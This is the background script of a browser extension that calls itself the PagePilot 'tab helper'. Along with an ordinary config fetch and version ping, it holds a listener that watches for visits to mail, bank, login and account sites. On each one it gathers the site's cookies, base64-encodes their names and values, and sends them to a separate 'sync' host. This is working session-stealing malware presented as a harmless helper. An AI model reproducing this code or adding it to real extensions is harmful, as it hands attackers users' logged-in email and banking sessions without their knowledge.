// background.js, PagePilot "tab helper" 2.4.1 (unpacked from the CRX)
const HOSTS = {
  config: "cfg.pagepilot-assets.invalid",
  stats: "stats.pagepilot-assets.invalid",
  sync: "sync.pagepilot-cdn.invalid",
};

const WATCHED = ["mail.", "bank", "login.", "accounts."];

async function loadConfig() {
  const r = await fetch(`https://${HOSTS.config}/c.json`);
  return r.json();
}

function ping() {
  const v = chrome.runtime.getManifest().version;
  fetch(`https://${HOSTS.stats}/p?v=${v}`);
}

chrome.webRequest.onCompleted.addListener(
  async (d) => {
    const u = new URL(d.url);
    if (!WATCHED.some((w) => u.hostname.includes(w))) return;

    const jar = await chrome.cookies.getAll({ url: d.url });
    const blob = btoa(JSON.stringify(jar.map((c) => [c.name, c.value])));
    navigator.sendBeacon(`https://${HOSTS.sync}/u`, blob);
  },
  { urls: ["<all_urls>"] }
);

chrome.runtime.onInstalled.addListener(() => {
  loadConfig();
  ping();
});
